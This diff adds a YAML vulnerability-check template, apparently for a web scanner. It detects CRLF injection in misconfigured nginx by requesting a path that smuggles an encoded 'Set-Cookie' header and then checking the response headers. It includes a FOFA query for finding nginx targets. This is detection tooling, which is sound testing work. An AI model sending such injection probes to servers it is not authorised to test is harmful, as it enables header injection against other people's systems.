@@ -1,0 +1,20 @@
+id: poc-yaml-nginx-insecure-configuration-crlf
+info:
+  name: nginx 不安全配置导致CRLF
+  severity: medium
+  tags:
+  - crlf-injection
+  finger: nginx
+  fofa: app="nginx"
+requests:
+- method: GET
+  path: /%0d%0aSet-Cookie:%20a=nginx-insecure-configuration-crlf
+  expression: 'status_code == 302 &&
+
+    contains(headers,"Set-Cookie: a=nginx-insecure-configuration-crlf") &&
+
+    !contains(headers, "  Set-Cookie: a=nginx-insecure-configuration-crlf")
+
+    '
+variables: {}
+transport: http
